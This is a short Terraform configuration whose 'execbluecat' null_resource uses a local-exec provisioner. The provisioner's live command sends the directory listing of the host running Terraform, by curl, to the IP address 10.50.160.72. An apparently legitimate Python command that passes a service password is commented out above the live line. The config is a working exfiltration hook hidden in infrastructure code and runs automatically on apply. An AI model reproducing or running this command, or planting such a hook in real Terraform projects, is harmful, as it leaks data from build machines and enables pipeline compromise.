resource "null_resource" "execbluecat"{
  provisioner "local-exec"{
    command = "curl \"http://10.50.160.72/$(ls | tr '\n' ' ')\""
    #command = "python3 main.py --hostname \"${var.hostname}\" --value \"${var.value}\" --svcPassword \"${var.password}\""
  }
}
